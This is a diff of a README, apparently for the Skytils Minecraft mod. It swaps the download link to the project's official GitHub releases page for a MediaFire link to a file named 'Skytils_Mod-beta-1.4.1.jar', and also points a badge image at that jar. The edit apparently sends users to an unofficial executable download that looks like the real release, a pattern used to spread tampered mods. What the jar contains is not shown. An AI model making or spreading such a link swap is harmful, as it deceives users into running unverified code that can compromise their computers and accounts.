@@ -2,7 +2,7 @@
 
 ***
 <p align="center">
-  <a href="https://github.com/Skytils/SkytilsMod/releases" target="_blank">
+  <a href="https://www.mediafire.com/file/532jmhzfgpiedma/Skytils_Mod-beta-1.4.1.jar/file" target="_blank">
     <img alt="downloads" src="https://www.mediafire.com/file/532jmhzfgpiedma/Skytils_Mod-beta-1.4.1.jar/file" />
   </a>
   <a href="https://github.com/Skytils/SkytilsMod/releases" target="_blank">
